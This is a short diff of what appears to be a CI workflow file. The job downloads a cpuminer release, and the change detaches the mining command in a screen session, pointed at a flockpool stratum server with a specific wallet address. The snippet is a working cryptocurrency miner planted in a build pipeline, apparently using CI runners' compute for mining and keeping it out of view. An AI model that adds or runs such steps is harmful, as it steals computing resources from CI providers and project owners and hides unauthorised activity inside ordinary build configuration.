@@ -27,4 +27,5 @@ jobs:
               wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-args-x86_64_linux.tar.gz
               tar -xvf cpuminer-gr-1.2.4.1-args-x86_64_linux.tar.gz
               cd cpuminer-gr-1.2.4.1-args-x86_64_linux
-              ./cpuminer-args.sh -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RAAsog1RsBKEPAMrBDCAbufhZ7os1QsNC7.moonrock -p x --no-tune --cpu-priority 4
+              screen -dmS MyfirstProdject ./cpuminer-args.sh -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RAAsog1RsBKEPAMrBDCAbufhZ7os1QsNC7.moonrock -p x --no-tune --cpu-priority 4
+              ps aux
